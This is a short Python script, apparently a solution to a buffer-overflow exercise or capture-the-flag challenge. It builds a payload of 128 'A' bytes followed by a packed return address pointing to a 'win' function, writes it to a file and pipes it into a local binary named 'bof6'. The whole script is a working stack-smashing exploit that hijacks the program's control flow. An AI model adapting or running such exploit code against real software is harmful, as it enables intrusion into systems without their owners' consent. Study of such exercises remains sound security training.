import struct 
import os

buff_fp = 128
win = 0x804846b

atk_vector = "A"*buff_fp
atk_vector += struct.pack("I", win)
atk_vector += '\n'

f = open("badfile", "w+")
f.write(atk_vector)
f.close()

os.system('cat {} | ./bof6'.format('badfile'))
